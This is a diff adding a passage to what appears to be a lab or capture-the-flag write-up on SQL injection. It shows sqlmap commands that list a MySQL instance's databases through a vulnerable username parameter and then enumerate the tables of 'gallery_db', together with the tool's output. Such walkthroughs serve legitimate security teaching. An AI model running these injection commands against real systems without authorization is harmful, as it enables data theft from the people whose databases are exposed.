@@ -143,3 +143,21 @@ Parameter: username (POST)
 ```
 
 As mentioned before, the username parameter is vulnerable and the backend is MySQL.
+
+### Getting Databases
+
+Now that I know that the username parameter is vulnerable, I can start to get useful information. First, I need to know what databases are in this instance of MySQL. I run the following command:
+
+`sqlmap -r request.txt --dbs`
+
+After a few minutes I got the following output:
+
+```bash
+available databases [2]:
+[*] gallery_db
+[*] information_schema
+```
+
+There are two databases, I can now select a database and get all the tables for that database. In my example, I only care about the gallery database. So I run the following command to get all the tables in the `gallery_db` database:
+
+`sqlmap -r request.txt -D gallery_db --tables`
